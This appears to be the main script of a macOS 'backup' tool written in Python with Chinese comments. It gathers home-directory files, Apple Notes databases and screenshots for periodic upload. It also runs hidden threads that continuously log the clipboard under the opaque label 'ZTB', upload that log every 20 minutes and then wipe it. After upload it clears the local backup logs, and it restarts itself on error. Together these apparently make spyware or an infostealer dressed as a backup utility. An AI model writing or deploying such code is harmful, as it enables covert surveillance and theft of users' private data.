# -*- coding: utf-8 -*-

import os
import sys
import time
import logging
import shutil
import threading
import subprocess
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

from .config import BackupConfig
from .manager import BackupManager

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_volumes():
    """获取所有可用的数据卷和云盘目录"""
    available_volumes = {}
    
    # 获取用户主目录
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("正在配置用户主目录备份...")
            logging.debug(f"用户主目录: {user_path}")
            
            # 配置用户主目录备份
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'home')
            available_volumes['home'] = {
                'docs': (os.path.abspath(user_path), os.path.join(backup_path, 'docs'), 1),
                'configs': (os.path.abspath(user_path), os.path.join(backup_path, 'configs'), 2),
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, 'specified'), 4),  # 使用specified替代shell
            }
            logging.info(f"✅ 已配置用户主目录备份: {user_path}")
            
        except Exception as e:
            logging.error(f"❌ 配置用户主目录备份时出错: {e}")
    
    if not available_volumes:
        logging.warning("⚠️ 未检测到可用的用户主目录")
    else:
        logging.info(f"📊 已配置用户主目录备份")
        for name, config in available_volumes.items():
            logging.info(f"  - {name}: {config['docs'][0]}")
    
    return available_volumes

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def clean_backup_directory():
    """清理备份目录中的临时文件和空目录"""
    try:
        if not os.path.exists(BackupConfig.BACKUP_ROOT):
            return
            
        # 清理临时目录
        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, 'temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"清理临时目录失败: {e}")
        
        # 清理空目录
        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # 如果目录为空
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"清理备份目录失败: {e}")

def backup_notes():
    """备份Mac的备忘录数据"""
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "notes")
    
    if not os.path.exists(notes_dir):
        logging.error("备忘录数据目录不存在")
        return None
        
    backup_manager = BackupManager()
    if not backup_manager._clean_directory(notes_backup_directory):
        return None
        
    try:
        # 复制备忘录数据
        for root, _, files in os.walk(notes_dir):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.storedata'):
                    source_file = os.path.join(root, file)
                    if not os.path.exists(source_file):
                        continue
                        
                    relative_path = os.path.relpath(root, notes_dir)
                    target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                    
                    if not backup_manager._ensure_directory(target_sub_dir):
                        continue
                        
                    try:
                        shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                    except Exception as e:
                        logging.error(f"复制备忘录文件失败: {e}")
                        continue
                        
        return notes_backup_directory if os.listdir(notes_backup_directory) else None
    except Exception as e:
        logging.error(f"备份备忘录数据失败: {e}")
        return None

def backup_screenshots():
    """备份截图文件"""
    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # 扫描整个目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含"screenshot"关键字（不区分大小写）
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info(f"📸 截图备份完成，共找到包含'screenshot'关键字的文件")
    else:
        logging.info("📸 未找到包含'screenshot'关键字的截图文件")
            
    return screenshot_backup_directory if files_found else None

def backup_mac_data(backup_manager):
    """备份Mac系统数据
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        bool: 所有Mac数据备份任务是否成功完成
    """
    all_success = True
    try:
        # 备份备忘录数据
        notes_backup = backup_notes()
        if notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 备忘录数据备份完成\n")
                else:
                    logging.error("❌ 备忘录数据备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 备忘录数据压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 备忘录数据收集失败\n")
            all_success = False
        
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 截图文件备份完成\n")
                else:
                    logging.error("❌ 截图文件备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 截图文件压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 截图文件收集失败\n")
            all_success = False
                    
        return all_success
        
    except Exception as e:
        logging.error(f"Mac数据备份失败: {e}")
        return False

def backup_volumes(backup_manager, available_volumes):
    """备份可用数据卷
    
    Returns:
        bool: 所有备份任务是否成功完成
    """
    all_success = True
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\n正在处理数据卷 {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                if backup_type == 'specified':
                    # 使用新的指定文件备份方法
                    backup_dir = backup_manager.backup_specified_files(source_dir, target_dir)
                else:
                    # 使用原有的备份方法
                    backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"☑️ {volume_name} {backup_type} 备份完成\n")
                        else:
                            logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
                            all_success = False
                    else:
                        logging.error(f"❌ {volume_name} {backup_type} 压缩失败\n")
                        all_success = False
                else:
                    logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
                    all_success = False
            except Exception as e:
                logging.error(f"❌ {volume_name} {backup_type} 备份出错: {str(e)}\n")
                all_success = False
    
    return all_success

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, "clipboard_log.txt")
    
    # 启动ZTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 ZTB监控线程已启动")
    
    # 启动ZTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 ZTB上传线程已启动")
    
    # 初始化ZTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"❌ 初始化ZTB日志失败: {e}")

    current_time = datetime.now()
    logging.critical("\n" + "="*40)
    logging.critical(f"🚀 自动备份系统已启动  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("📋 ZTB监控和自动上传已启动")
    logging.critical("="*40)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(BackupConfig.THRESHOLD_FILE):
                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                backup_success = True
                
                # 获取当前可用的数据卷
                available_volumes = get_available_volumes()
                
                # 执行备份任务
                logging.critical("\n💾 数据卷备份")
                if not backup_volumes(backup_manager, available_volumes):
                    backup_success = False
                
                logging.critical("\n🍎 Mac系统数据备份")
                if not backup_mac_data(backup_manager):
                    backup_success = False
                
                # 在备份完成后上传日志
                logging.critical("\n📝 正在上传备份日志...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"❌ 日志备份上传失败: {e}")
                    backup_success = False
                
                # 写入下次备份时间
                next_backup_time = write_next_backup_time()
                
                if backup_success:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    if next_backup_time:
                        logging.critical(f"⏳ 下次备份: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    if next_backup_time:
                        logging.critical(f"⏳ 下次备份: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
            
            # 每小时检查一次是否需要备份
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            # 发生错误时也更新下次备份时间
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            return
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            return
            
        # 创建临时目录
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # 复制日志文件到临时目录
        try:
            # 读取当前日志内容
            with open(log_file, 'r', encoding='utf-8') as src:
                log_content = src.read()
                
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
                
            # 上传日志文件
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后清空原始日志文件，只保留一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                except Exception:
                    logging.error("❌ 备份日志更新失败")
            else:
                logging.error("❌ 备份日志上传失败")
                
        except Exception:
            return
            
        # 清理临时目录
        try:
            if os.path.exists(str(temp_dir)):
                shutil.rmtree(str(temp_dir))
        except Exception:
            pass
                
    except Exception:
        logging.error("❌ 处理备份日志时出错")

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ZTB上传线程
    
    Args:
        backup_manager: 备份管理器实例
        clipboard_log_path: ZTB日志文件路径
    """
    last_upload_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # 检查是否需要上传（每20分钟检查一次）
            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    # 检查文件大小
                    file_size = os.path.getsize(clipboard_log_path)
                    if file_size > 0:
                        # 检查文件内容是否有实际记录
                        if backup_manager.has_clipboard_content(clipboard_log_path):
                            # 创建临时文件
                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'clipboard')
                            if backup_manager._ensure_directory(temp_dir):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                temp_file = os.path.join(temp_dir, f"clipboard_{timestamp}.txt")
                                
                                try:
                                    # 复制日志内容到临时文件
                                    shutil.copy2(clipboard_log_path, temp_file)
                                    
                                    # 上传临时文件
                                    if backup_manager.upload_file(temp_file):
                                        # 上传成功后清空原始日志文件
                                        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                            f.write(f"=== 📋 ZTB日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                                        last_upload_time = current_time
                                        if backup_manager.config.DEBUG_MODE:
                                            logging.info("📤 ZTB日志上传成功")
                                except Exception as e:
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.error(f"❌ ZTB日志上传失败: {e}")
                                finally:
                                    # 清理临时目录
                                    try:
                                        if os.path.exists(temp_dir):
                                            shutil.rmtree(temp_dir)
                                    except Exception:
                                        pass
                        else:
                            # 文件没有实际内容，清空文件并重置上传时间
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("📋 ZTB文件无实际内容，跳过上传")
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                            last_upload_time = current_time
                
            # 定期检查
            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
            
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"ZTB上传线程错误: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def main():
    """主函数"""
    pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
    try:
        # 检查是否已经有实例在运行
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'备份程序已经在运行 (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # 写入当前进程PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # 注意：日志配置在 BackupManager.__init__ 中进行，无需重复配置
        
        # 检查磁盘空间
        try:
            # 在 macOS 上直接使用备份根目录
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
        except Exception as e:
            logging.warning(f'无法检查磁盘空间: {e}')
        
        # 创建备份管理器实例
        backup_manager = BackupManager()
        
        # 清理旧的备份目录
        clean_backup_directory()
        
        # 启动定期备份和上传
        periodic_backup_upload(backup_manager)
            
    except KeyboardInterrupt:
        logging.info('备份程序被用户中断')
    except Exception as e:
        logging.error(f'备份过程发生错误: {str(e)}')
        # 发生错误时等待一段时间后重试
        time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
        main()  # 重新启动主程序
    finally:
        # 清理PID文件
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'清理PID文件失败: {str(e)}')

if __name__ == "__main__":
    main()
